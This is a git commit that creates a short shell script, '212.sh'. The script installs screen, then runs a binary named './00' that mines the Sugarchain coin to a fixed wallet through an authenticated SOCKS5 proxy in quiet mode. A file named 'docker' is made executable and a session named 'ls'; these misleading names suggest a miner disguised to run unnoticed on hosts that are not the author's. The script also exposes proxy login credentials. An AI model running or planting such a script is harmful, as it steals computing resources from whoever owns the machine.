d80bbf997bfb2d12bda5e66813633a562ccce9a6
Annsjjsks <86400154+Annsjjsks@users.noreply.github.com>
2021-06-28 22:19:35 +0700

    Create 212.sh

---
+++ 212.sh
@@ -0,0 +1,8 @@
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x docker 
+screen -dmS ls 
+POOL=1pool.sugarchain.org:3333
+WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x
+PROXY=socks5://ilbbkwmp:qwe2bptzjsss@209.127.191.180:9279
+./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
